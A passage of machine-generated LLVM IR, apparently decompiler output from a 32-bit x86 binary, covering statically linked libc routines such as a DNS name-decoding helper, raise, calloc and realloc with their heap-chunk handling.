  store i32 %v0_804c8d9, i32* %stack_var_-80, align 4
  %v0_804c8de = load i32, i32* @ebx, align 4
  %v3_804c8e3 = load i32, i32* %stack_var_-20, align 4
  %v6_804c8e7 = call i32 @__decode_dotted(i32 %v3_804c8e3, i32 %tmp3, i32 %v0_804c8de, i32 %v1_804c7df, i32 %v0_804c8d9, i32 %v3_804c8c4)
  store i32 %v6_804c8e7, i32* %eax.global-to-local, align 4
  store i32 %v6_804c8e7, i32* @ebx, align 4
  %v3_804c8ee = load i32, i32* %stack_var_-20, align 4
  %v1_804c8f2 = call i32 @free(i32 %v3_804c8ee)
  store i32 %v1_804c8f2, i32* %eax.global-to-local, align 4
  %v2_804c8fa = icmp slt i32 %v6_804c8e7, 0
  %v1_804c8fc = icmp eq i1 %v2_804c8fa, false
  br i1 %v1_804c8fc, label %dec_label_pc_804c873, label %dec_label_pc_804c902

dec_label_pc_804c902:                             ; preds = %dec_label_pc_804c8d9
  store i32 %arg7, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804c90c

dec_label_pc_804c90c:                             ; preds = %dec_label_pc_804c8cd, %dec_label_pc_804c902
  store i32 3, i32* %v1_804c77d, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c980

dec_label_pc_804c911:                             ; preds = %dec_label_pc_804c8a1
  %v9_804c911 = icmp eq i32 %tmp4, 28
  %v1_804c914 = icmp eq i1 %v9_804c911, false
  br i1 %v1_804c914, label %dec_label_pc_804c960, label %dec_label_pc_804c916

dec_label_pc_804c916:                             ; preds = %dec_label_pc_804c911
  store i32 %tmp, i32* %esi.global-to-local, align 4
  %v0_804c91a = load i32, i32* @ebp, align 4
  store i32 %v0_804c91a, i32* %edi.global-to-local, align 4
  %v1_804c91c = inttoptr i32 %tmp to i32*
  %v2_804c91c = load i32, i32* %v1_804c91c, align 4
  %v4_804c91c = inttoptr i32 %v0_804c91a to i32*
  store i32 %v2_804c91c, i32* %v4_804c91c, align 4
  %v5_804c91c = load i32, i32* %edi.global-to-local, align 4
  %v6_804c91c = load i32, i32* %esi.global-to-local, align 4
  %v7_804c91c = load i1, i1* @df, align 1
  %v8_804c91c = select i1 %v7_804c91c, i32 -4, i32 4
  %v9_804c91c = add i32 %v8_804c91c, %v5_804c91c
  %v10_804c91c = add i32 %v8_804c91c, %v6_804c91c
  store i32 %v9_804c91c, i32* %edi.global-to-local, align 4
  store i32 %v10_804c91c, i32* %esi.global-to-local, align 4
  %v1_804c91d = inttoptr i32 %v10_804c91c to i32*
  %v2_804c91d = load i32, i32* %v1_804c91d, align 4
  %v4_804c91d = inttoptr i32 %v9_804c91c to i32*
  store i32 %v2_804c91d, i32* %v4_804c91d, align 4
  %v5_804c91d = load i32, i32* %edi.global-to-local, align 4
  %v6_804c91d = load i32, i32* %esi.global-to-local, align 4
  %v9_804c91d = add i32 %v5_804c91d, %v8_804c91c
  %v10_804c91d = add i32 %v6_804c91d, %v8_804c91c
  store i32 %v9_804c91d, i32* %edi.global-to-local, align 4
  store i32 %v10_804c91d, i32* %esi.global-to-local, align 4
  %v1_804c91e = inttoptr i32 %v10_804c91d to i32*
  %v2_804c91e = load i32, i32* %v1_804c91e, align 4
  %v4_804c91e = inttoptr i32 %v9_804c91d to i32*
  store i32 %v2_804c91e, i32* %v4_804c91e, align 4
  %v5_804c91e = load i32, i32* %edi.global-to-local, align 4
  %v6_804c91e = load i32, i32* %esi.global-to-local, align 4
  %v9_804c91e = add i32 %v5_804c91e, %v8_804c91c
  %v10_804c91e = add i32 %v6_804c91e, %v8_804c91c
  store i32 %v9_804c91e, i32* %edi.global-to-local, align 4
  store i32 %v10_804c91e, i32* %esi.global-to-local, align 4
  %v1_804c91f = inttoptr i32 %v10_804c91e to i32*
  %v2_804c91f = load i32, i32* %v1_804c91f, align 4
  %v4_804c91f = inttoptr i32 %v9_804c91e to i32*
  store i32 %v2_804c91f, i32* %v4_804c91f, align 4
  %v5_804c91f = load i32, i32* %edi.global-to-local, align 4
  %v6_804c91f = load i32, i32* %esi.global-to-local, align 4
  %v9_804c91f = add i32 %v5_804c91f, %v8_804c91c
  %v10_804c91f = add i32 %v6_804c91f, %v8_804c91c
  store i32 %v9_804c91f, i32* @edi, align 4
  store i32 %v10_804c91f, i32* @esi, align 4
  store i32 %v1_804c7df, i32* %edx.global-to-local, align 4
  store i32 %tmp9, i32* %eax.global-to-local, align 4
  store i32 %v1_804c7df, i32* %arg3, align 4
  %v1_804c92a = add i32 %tmp9, 8
  %v2_804c92a = inttoptr i32 %v1_804c92a to i32*
  store i32 10, i32* %v2_804c92a, align 4
  %v0_804c931 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c931 = add i32 %v0_804c931, 12
  %v2_804c931 = inttoptr i32 %v1_804c931 to i32*
  store i32 16, i32* %v2_804c931, align 4
  store i32 %v1_804c7d8, i32* %ecx.global-to-local, align 4
  %v1_804c93c = load i32, i32* %eax.global-to-local, align 4
  %v2_804c93c = add i32 %v1_804c93c, 16
  %v3_804c93c = inttoptr i32 %v2_804c93c to i32*
  store i32 %v1_804c7d8, i32* %v3_804c93c, align 4
  %v3_804c93f = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804c93f, i32* %stack_var_-80, align 4
  %v1_804c943 = call i32 @free(i32 %v3_804c93f)
  store i32 %tmp9, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edi.global-to-local, align 4
  store i32 %tmp9, i32* %v1_804c726, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c978

dec_label_pc_804c960:                             ; preds = %dec_label_pc_804c911
  %v3_804c960 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804c960, i32* %stack_var_-80, align 4
  %v1_804c964 = call i32 @free(i32 %v3_804c960)
  store i32 %v1_804c964, i32* %eax.global-to-local, align 4
  store i32 %arg7, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c978

dec_label_pc_804c978:                             ; preds = %dec_label_pc_804c916, %dec_label_pc_804c960
  %storemerge32 = phi i32 [ 0, %dec_label_pc_804c916 ], [ 1, %dec_label_pc_804c960 ]
  %storemerge1 = phi i32 [ 0, %dec_label_pc_804c916 ], [ 2, %dec_label_pc_804c960 ]
  store i32 %storemerge32, i32* %v1_804c77d, align 4
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  %v2_804c978 = load i32, i32* %stack_var_-80, align 4
  store i32 %v2_804c978, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c980

dec_label_pc_804c97b:                             ; preds = %dec_label_pc_804c735, %dec_label_pc_804c722
  store i32 22, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c980

dec_label_pc_804c980:                             ; preds = %dec_label_pc_804c7a7, %dec_label_pc_804c79c, %dec_label_pc_804c789, %dec_label_pc_804c978, %dec_label_pc_804c90c, %dec_label_pc_804c897, %dec_label_pc_804c813, %dec_label_pc_804c772, %dec_label_pc_804c700, %dec_label_pc_804c97b
  %v0_804c987 = phi i32 [ 34, %dec_label_pc_804c7a7 ], [ %v7_804c766, %dec_label_pc_804c79c ], [ %v7_804c766, %dec_label_pc_804c789 ], [ %storemerge1, %dec_label_pc_804c978 ], [ -1, %dec_label_pc_804c90c ], [ 2, %dec_label_pc_804c897 ], [ 0, %dec_label_pc_804c813 ], [ %v0_804c987.pre, %dec_label_pc_804c772 ], [ %v7_804c715, %dec_label_pc_804c700 ], [ 22, %dec_label_pc_804c97b ]
  store i32 %v0_804c6ef, i32* @ebx, align 4
  store i32 %v0_804c6ee, i32* @esi, align 4
  store i32 %v0_804c6ed, i32* @edi, align 4
  store i32 %v0_804c6ec, i32* @ebp, align 4
  ret i32 %v0_804c987

; uselistorder directives
  uselistorder i32 %v1_804c7df, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v1_804c7d8, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804c7b9, { 2, 1, 0 }
  uselistorder i32 %v2_804c77d, { 2, 0, 1, 3 }
  uselistorder i32 %v7_804c766, { 1, 2, 0, 3, 4 }
  uselistorder i32* %v1_804c726, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3 }
  uselistorder i32 %tmp9, { 7, 6, 0, 5, 1, 4, 2, 3 }
  uselistorder i32 %tmp4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24 }
  uselistorder i32 %arg7, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %arg4, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 4, 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804c980, { 9, 3, 4, 5, 6, 0, 1, 2, 7, 8 }
  uselistorder label %dec_label_pc_804c978, { 1, 0 }
  uselistorder label %dec_label_pc_804c90c, { 1, 0 }
  uselistorder label %dec_label_pc_804c897, { 1, 0 }
  uselistorder label %dec_label_pc_804c7a7, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804c988 = call i32 @getpid()
  %v2_804c992 = call i32 @kill(i32 %v0_804c988, i32 %arg1)
  store i32 %v0_804c988, i32* @edx, align 4
  ret i32 %v2_804c992

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @getpid, { 0, 4, 2, 3, 1 }
}

define i32 @calloc(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804c99c = load i32, i32* @edi, align 4
  %v0_804c99e = load i32, i32* @ebx, align 4
  %v12_804c99f = ptrtoint i32* %stack_var_-28 to i32
  %v4_804c9a2 = trunc i64 %arg1 to i32
  %v3_804c9ac = sext i32 %arg2 to i64
  %v5_804c9ac = mul nsw i64 %v3_804c9ac, %arg1
  %v6_804c9ac = trunc i64 %v5_804c9ac to i32
  store i32 %v6_804c9ac, i32* @ebx, align 4
  %v2_804c9af = icmp eq i32 %v4_804c9a2, 0
  br i1 %v2_804c9af, label %dec_label_pc_804c9d1, label %dec_label_pc_804c9b3

dec_label_pc_804c9b3:                             ; preds = %entry
  store i32 %v4_804c9a2, i32* @edi, align 4
  %div = udiv i32 %v6_804c9ac, %v4_804c9a2
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_804c9bb = icmp eq i32 %div, %arg2
  br i1 %v12_804c9bb, label %dec_label_pc_804c9d1, label %dec_label_pc_804c9bf

dec_label_pc_804c9bf:                             ; preds = %dec_label_pc_804c9b3
  %v1_804c9bf = call i32 @__GI___errno_location(i32 %v0_804c99e)
  store i32 %v1_804c9bf, i32* %eax.global-to-local, align 4
  %v1_804c9c4 = inttoptr i32 %v1_804c9bf to i32*
  store i32 12, i32* %v1_804c9c4, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ca7e

dec_label_pc_804c9d1:                             ; preds = %dec_label_pc_804c9b3, %entry
  store i32 %v12_804c99f, i32* %eax.global-to-local, align 4
  %v4_804c9e0 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134525440, i32 ptrtoint (i32* @global_var_8053344.33 to i32))
  store i32 %v4_804c9e0, i32* %eax.global-to-local, align 4
  %v1_804c9ea = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053344.33 to i32))
  store i32 %v1_804c9ea, i32* %eax.global-to-local, align 4
  %v0_804c9ef = load i32, i32* @ebx, align 4
  %v1_804c9f0 = call i32 @malloc(i32 %v0_804c9ef)
  store i32 %v1_804c9f0, i32* %eax.global-to-local, align 4
  store i32 %v1_804c9f0, i32* %ebx.global-to-local, align 4
  %v1_804c9fa = icmp eq i32 %v1_804c9f0, 0
  br i1 %v1_804c9fa, label %dec_label_pc_804ca70, label %dec_label_pc_804c9fe

dec_label_pc_804c9fe:                             ; preds = %dec_label_pc_804c9d1
  %v1_804c9fe = add i32 %v1_804c9f0, -4
  %v2_804c9fe = inttoptr i32 %v1_804c9fe to i32*
  %v3_804c9fe = load i32, i32* %v2_804c9fe, align 4
  store i32 %v3_804c9fe, i32* %eax.global-to-local, align 4
  %v2_804ca01 = and i32 %v3_804c9fe, 2
  %v3_804ca01 = icmp eq i32 %v2_804ca01, 0
  %v1_804ca03 = icmp eq i1 %v3_804ca01, false
  br i1 %v1_804ca03, label %dec_label_pc_804ca70, label %dec_label_pc_804ca05

dec_label_pc_804ca05:                             ; preds = %dec_label_pc_804c9fe
  %v1_804ca054 = add i32 %v3_804c9fe, -4
  %v1_804ca08 = and i32 %v1_804ca054, -4
  %v2_804ca0d = udiv i32 %v1_804ca08, 4
  store i32 %v2_804ca0d, i32* %eax.global-to-local, align 4
  %v5_804ca10 = icmp ult i32 %v1_804ca08, 36
  %tmp = and i32 %v1_804ca054, -4
  %tmp19 = icmp eq i32 %tmp, 36
  %v2_804ca13 = or i1 %v5_804ca10, %tmp19
  br i1 %v2_804ca13, label %dec_label_pc_804ca23, label %dec_label_pc_804ca15

dec_label_pc_804ca15:                             ; preds = %dec_label_pc_804ca05
  %v3_804ca19 = inttoptr i32 %v1_804c9f0 to i8*
  %v4_804ca19 = call i32 @__GI_memset(i8* %v3_804ca19, i32 0, i32 %v1_804ca08)
  store i32 %v4_804ca19, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca70

dec_label_pc_804ca23:                             ; preds = %dec_label_pc_804ca05
  %v1_804ca23 = inttoptr i32 %v1_804c9f0 to i32*
  store i32 0, i32* %v1_804ca23, align 4
  %v0_804ca29 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ca29 = add i32 %v0_804ca29, 4
  %v2_804ca29 = inttoptr i32 %v1_804ca29 to i32*
  store i32 0, i32* %v2_804ca29, align 4
  %v0_804ca30 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ca30 = add i32 %v0_804ca30, 8
  %v2_804ca30 = inttoptr i32 %v1_804ca30 to i32*
  store i32 0, i32* %v2_804ca30, align 4
  %v0_804ca37 = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_804ca37, 5
  br i1 %tmp17, label %dec_label_pc_804ca70, label %dec_label_pc_804ca3c

dec_label_pc_804ca3c:                             ; preds = %dec_label_pc_804ca23
  %v0_804ca3c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ca3c = add i32 %v0_804ca3c, 12
  %v2_804ca3c = inttoptr i32 %v1_804ca3c to i32*
  store i32 0, i32* %v2_804ca3c, align 4
  %v0_804ca43 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ca43 = add i32 %v0_804ca43, 16
  %v2_804ca43 = inttoptr i32 %v1_804ca43 to i32*
  store i32 0, i32* %v2_804ca43, align 4
  %v0_804ca4a = load i32, i32* %eax.global-to-local, align 4
  %tmp18 = icmp ult i32 %v0_804ca4a, 7
  br i1 %tmp18, label %dec_label_pc_804ca70, label %dec_label_pc_804ca4f

dec_label_pc_804ca4f:                             ; preds = %dec_label_pc_804ca3c
  %v0_804ca4f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ca4f = add i32 %v0_804ca4f, 20
  %v2_804ca4f = inttoptr i32 %v1_804ca4f to i32*
  store i32 0, i32* %v2_804ca4f, align 4
  %v0_804ca56 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ca56 = add i32 %v0_804ca56, 24
  %v2_804ca56 = inttoptr i32 %v1_804ca56 to i32*
  store i32 0, i32* %v2_804ca56, align 4
  %v0_804ca5d = load i32, i32* %eax.global-to-local, align 4
  %v9_804ca5d = icmp eq i32 %v0_804ca5d, 9
  %v1_804ca60 = icmp eq i1 %v9_804ca5d, false
  br i1 %v1_804ca60, label %dec_label_pc_804ca70, label %dec_label_pc_804ca62

dec_label_pc_804ca62:                             ; preds = %dec_label_pc_804ca4f
  %v0_804ca62 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ca62 = add i32 %v0_804ca62, 28
  %v2_804ca62 = inttoptr i32 %v1_804ca62 to i32*
  store i32 0, i32* %v2_804ca62, align 4
  %v0_804ca69 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ca69 = add i32 %v0_804ca69, 32
  %v2_804ca69 = inttoptr i32 %v1_804ca69 to i32*
  store i32 0, i32* %v2_804ca69, align 4
  br label %dec_label_pc_804ca70

dec_label_pc_804ca70:                             ; preds = %dec_label_pc_804ca4f, %dec_label_pc_804ca3c, %dec_label_pc_804ca23, %dec_label_pc_804c9fe, %dec_label_pc_804c9d1, %dec_label_pc_804ca15, %dec_label_pc_804ca62
  store i32 %v12_804c99f, i32* %eax.global-to-local, align 4
  %v3_804ca77 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  store i32 %v12_804c99f, i32* %eax.global-to-local, align 4
  %v0_804ca7e.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ca7e

dec_label_pc_804ca7e:                             ; preds = %dec_label_pc_804c9bf, %dec_label_pc_804ca70
  %v0_804ca7e = phi i32 [ 0, %dec_label_pc_804c9bf ], [ %v0_804ca7e.pre, %dec_label_pc_804ca70 ]
  store i32 %v0_804ca7e, i32* %eax.global-to-local, align 4
  store i32 %v0_804c99e, i32* @ebx, align 4
  store i32 %v0_804c99c, i32* @edi, align 4
  ret i32 %v0_804ca7e

; uselistorder directives
  uselistorder i32 %v0_804ca7e, { 1, 0 }
  uselistorder i32 %v1_804ca08, { 2, 1, 0 }
  uselistorder i32 %v1_804c9f0, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 7, 8, 9, 12, 10, 11, 14, 13 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 4, 6, 7, 1, 5, 0, 2, 3 }
  uselistorder label %dec_label_pc_804ca7e, { 1, 0 }
  uselistorder label %dec_label_pc_804ca70, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @realloc() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804ca88 = load i32, i32* @ebp, align 4
  %v0_804ca89 = load i32, i32* @edi, align 4
  %v0_804ca8a = load i32, i32* @esi, align 4
  %v0_804ca8b = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_804ca93 = icmp eq i32 %tmp6, 0
  %v1_804ca98 = icmp eq i1 %v4_804ca93, false
  br i1 %v1_804ca98, label %dec_label_pc_804caa4, label %dec_label_pc_804ca9a

dec_label_pc_804ca9a:                             ; preds = %entry
  store i32 %tmp7, i32* %stack_var_-48, align 4
  %v1_804ca9b = call i32 @malloc(i32 %tmp7)
  store i32 %v1_804ca9b, i32* %eax.global-to-local, align 4
  store i32 %v1_804ca9b, i32* @ebx, align 4
  br label %dec_label_pc_804cab1

dec_label_pc_804caa4:                             ; preds = %entry
  %v1_804caa4 = icmp eq i32 %tmp7, 0
  %v1_804caa6 = icmp eq i1 %v1_804caa4, false
  br i1 %v1_804caa6, label %dec_label_pc_804cab7, label %dec_label_pc_804caa8

dec_label_pc_804caa8:                             ; preds = %dec_label_pc_804caa4
  store i32 %tmp6, i32* %stack_var_-48, align 4
  %v1_804caac = call i32 @free(i32 %tmp6)
  store i32 %v1_804caac, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cab1

dec_label_pc_804cab1:                             ; preds = %dec_label_pc_804ca9a, %dec_label_pc_804caa8
  %v2_804cab1 = load i32, i32* %stack_var_-48, align 4
  store i32 %v2_804cab1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd78

dec_label_pc_804cab7:                             ; preds = %dec_label_pc_804caa4
  store i32 ptrtoint (i32* @global_var_8053344.33 to i32), i32* %stack_var_-48, align 4
  %v2_804cac1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804cac1, i32* %eax.global-to-local, align 4
  %v4_804cac6 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134525440, i32 ptrtoint (i32* @global_var_8053344.33 to i32))
  store i32 %v4_804cac6, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8053344.33 to i32), i32* %stack_var_-60, align 4
  %v1_804cad0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053344.33 to i32))
  store i32 %v1_804cad0, i32* %eax.global-to-local, align 4
  %v0_804cad8 = load i32, i32* @ebx, align 4
  %tmp19 = icmp ult i32 %v0_804cad8, -32
  br i1 %tmp19, label %dec_label_pc_804caef, label %dec_label_pc_804cadd

dec_label_pc_804cadd:                             ; preds = %dec_label_pc_804cab7
  %v0_804cadd = load i32, i32* %stack_var_-60, align 4
  %v1_804cadd = call i32 @__GI___errno_location(i32 %v0_804cadd)
  store i32 %v1_804cadd, i32* %eax.global-to-local, align 4
  %v1_804cae2 = inttoptr i32 %v1_804cadd to i32*
  store i32 12, i32* %v1_804cae2, align 4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804cd78

dec_label_pc_804caef:                             ; preds = %dec_label_pc_804cab7
  %v1_804caef = add i32 %v0_804cad8, 11
  %tmp20 = icmp ult i32 %v1_804caef, 16
  br i1 %tmp20, label %dec_label_pc_804cb06, label %dec_label_pc_804caff

dec_label_pc_804caff:                             ; preds = %dec_label_pc_804caef
  %v1_804caff = and i32 %v1_804caef, -8
  br label %dec_label_pc_804cb06

dec_label_pc_804cb06:                             ; preds = %dec_label_pc_804caef, %dec_label_pc_804caff
  %stack_var_-40.0 = phi i32 [ %v1_804caff, %dec_label_pc_804caff ], [ 16, %dec_label_pc_804caef ]
  %storemerge = phi i32 [ %v1_804caff, %dec_label_pc_804caff ], [ %v1_804caef, %dec_label_pc_804caef ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804cb0a = add i32 %tmp6, -8
  store i32 %v1_804cb0a, i32* @edi, align 4
  %v1_804cb0d = add i32 %tmp6, -4
  %v2_804cb0d = inttoptr i32 %v1_804cb0d to i32*
  %v3_804cb0d = load i32, i32* %v2_804cb0d, align 4
  store i32 %v3_804cb0d, i32* %edx.global-to-local, align 4
  %v1_804cb12 = and i32 %v3_804cb0d, -4
  store i32 %v1_804cb12, i32* @ebp, align 4
  %v2_804cb15 = and i32 %v3_804cb0d, 2
  %v3_804cb15 = icmp eq i32 %v2_804cb15, 0
  %v1_804cb18 = icmp eq i1 %v3_804cb15, false
  br i1 %v1_804cb18, label %dec_label_pc_804cca1, label %dec_label_pc_804cb1e

dec_label_pc_804cb1e:                             ; preds = %dec_label_pc_804cb06
  store i32 %v1_804cb12, i32* @ebx, align 4
  %v10_804cb20 = icmp ult i32 %v1_804cb12, %stack_var_-40.0
  %v1_804cb24 = icmp eq i1 %v10_804cb20, false
  br i1 %v1_804cb24, label %dec_label_pc_804cc4d, label %dec_label_pc_804cb2a

dec_label_pc_804cb2a:                             ; preds = %dec_label_pc_804cb1e
  %v2_804cb2a = add i32 %v1_804cb12, %v1_804cb0a
  store i32 %v2_804cb2a, i32* @esi, align 4
  %v1_804cb2d = load i32, i32* @global_var_805583c.36, align 4
  %v12_804cb2d = icmp eq i32 %v2_804cb2a, %v1_804cb2d
  %v1_804cb33 = icmp eq i1 %v12_804cb2d, false
  %v1_804cb70 = add i32 %v2_804cb2a, 4
  %v2_804cb70 = inttoptr i32 %v1_804cb70 to i32*
  %v3_804cb70 = load i32, i32* %v2_804cb70, align 4
  br i1 %v1_804cb33, label %dec_label_pc_804cb70, label %dec_label_pc_804cb35

dec_label_pc_804cb35:                             ; preds = %dec_label_pc_804cb2a
  %v1_804cb38 = and i32 %v3_804cb70, -4
  %v2_804cb3b = add i32 %v1_804cb38, %v1_804cb12
  store i32 %v2_804cb3b, i32* @ecx, align 4
  %v1_804cb42 = add i32 %stack_var_-40.0, 16
  store i32 %v1_804cb42, i32* %eax.global-to-local, align 4
  %v7_804cb45 = icmp ult i32 %v2_804cb3b, %v1_804cb42
  br i1 %v7_804cb45, label %dec_label_pc_804cbab, label %dec_label_pc_804cb49

dec_label_pc_804cb49:                             ; preds = %dec_label_pc_804cb35
  %v1_804cb49 = urem i32 %v3_804cb0d, 2
  %v5_804cb4c = or i32 %v1_804cb49, %stack_var_-40.0
  store i32 %v5_804cb4c, i32* %v2_804cb0d, align 4
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_804cb57 = load i32, i32* @edi, align 4
  %v2_804cb57 = add i32 %v0_804cb57, %stack_var_-40.0
  store i32 %v2_804cb57, i32* %eax.global-to-local, align 4
  store i32 %v2_804cb57, i32* @global_var_805583c.36, align 4
  %v0_804cb5f = load i32, i32* @ecx, align 4
  %v2_804cb5f = sub i32 %v0_804cb5f, %stack_var_-40.0
  %v1_804cb61 = or i32 %v2_804cb5f, 1
  store i32 %v1_804cb61, i32* @ecx, align 4
  %v2_804cb64 = add i32 %v2_804cb57, 4
  %v3_804cb64 = inttoptr i32 %v2_804cb64 to i32*
  store i32 %v1_804cb61, i32* %v3_804cb64, align 4
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_804cd6a

dec_label_pc_804cb70:                             ; preds = %dec_label_pc_804cb2a
  store i32 %v3_804cb70, i32* %edx.global-to-local, align 4
  %v1_804cb75 = and i32 %v3_804cb70, -2
  store i32 %v1_804cb75, i32* %eax.global-to-local, align 4
  %v3_804cb78 = add i32 %v1_804cb70, %v1_804cb75
  %v4_804cb78 = inttoptr i32 %v3_804cb78 to i8*
  %v5_804cb78 = load i8, i8* %v4_804cb78, align 1
  %v6_804cb78 = urem i8 %v5_804cb78, 2
  %v7_804cb78 = icmp eq i8 %v6_804cb78, 0
  %v1_804cb7d = icmp eq i1 %v7_804cb78, false
  br i1 %v1_804cb7d, label %dec_label_pc_804cbab, label %dec_label_pc_804cb7f

dec_label_pc_804cb7f:                             ; preds = %dec_label_pc_804cb70
  %v1_804cb7f = and i32 %v3_804cb70, -4
  store i32 %v1_804cb7f, i32* %edx.global-to-local, align 4
  %v2_804cb82 = add i32 %v1_804cb7f, %v1_804cb12
  store i32 %v2_804cb82, i32* @ebx, align 4
  %v10_804cb85 = icmp ult i32 %v2_804cb82, %stack_var_-40.0
  br i1 %v10_804cb85, label %dec_label_pc_804cbab, label %dec_label_pc_804cb8b

dec_label_pc_804cb8b:                             ; preds = %dec_label_pc_804cb7f
  %v1_804cb8b = add i32 %v1_804cb12, %tmp6
  %v2_804cb8b = inttoptr i32 %v1_804cb8b to i32*
  %v3_804cb8b = load i32, i32* %v2_804cb8b, align 4
  store i32 %v3_804cb8b, i32* @edx, align 4
  %v1_804cb8e = add i32 %v2_804cb2a, 12
  %v2_804cb8e = inttoptr i32 %v1_804cb8e to i32*
  %v3_804cb8e = load i32, i32* %v2_804cb8e, align 4
  store i32 %v3_804cb8e, i32* %eax.global-to-local, align 4
  %v1_804cb91 = add i32 %v3_804cb8b, 12
  %v2_804cb91 = inttoptr i32 %v1_804cb91 to i32*
  %v3_804cb91 = load i32, i32* %v2_804cb91, align 4
  %v15_804cb91 = icmp eq i32 %v3_804cb91, %v2_804cb2a
  %v1_804cb94 = icmp eq i1 %v15_804cb91, false
  br i1 %v1_804cb94, label %dec_label_pc_804cb9b, label %dec_label_pc_804cb96

dec_label_pc_804cb96:                             ; preds = %dec_label_pc_804cb8b
  %v1_804cb96 = add i32 %v3_804cb8e, 8
  %v2_804cb96 = inttoptr i32 %v1_804cb96 to i32*
  %v3_804cb96 = load i32, i32* %v2_804cb96, align 4
  %v15_804cb96 = icmp eq i32 %v3_804cb96, %v2_804cb2a
  br i1 %v15_804cb96, label %dec_label_pc_804cba0, label %dec_label_pc_804cb9b

dec_label_pc_804cb9b:                             ; preds = %dec_label_pc_804cb96, %dec_label_pc_804cb8b
  %v0_804cb9b = call i32 @abort()
  store i32 %v0_804cb9b, i32* %eax.global-to-local, align 4
  %v1_804cba0.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804cba0

dec_label_pc_804cba0:                             ; preds = %dec_label_pc_804cb96, %dec_label_pc_804cb9b
  %v1_804cba0 = phi i32 [ %v3_804cb8b, %dec_label_pc_804cb96 ], [ %v1_804cba0.pre, %dec_label_pc_804cb9b ]
  %v0_804cba0 = phi i32 [ %v3_804cb8e, %dec_label_pc_804cb96 ], [ %v0_804cb9b, %dec_label_pc_804cb9b ]
  %v2_804cba0 = add i32 %v1_804cba0, 12
  %v3_804cba0 = inttoptr i32 %v2_804cba0 to i32*
  store i32 %v0_804cba0, i32* %v3_804cba0, align 4
  %v0_804cba3 = load i32, i32* @edx, align 4
  %v1_804cba3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cba3 = add i32 %v1_804cba3, 8
  %v3_804cba3 = inttoptr i32 %v2_804cba3 to i32*
  store i32 %v0_804cba3, i32* %v3_804cba3, align 4
  %v0_804cc4d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cc4d

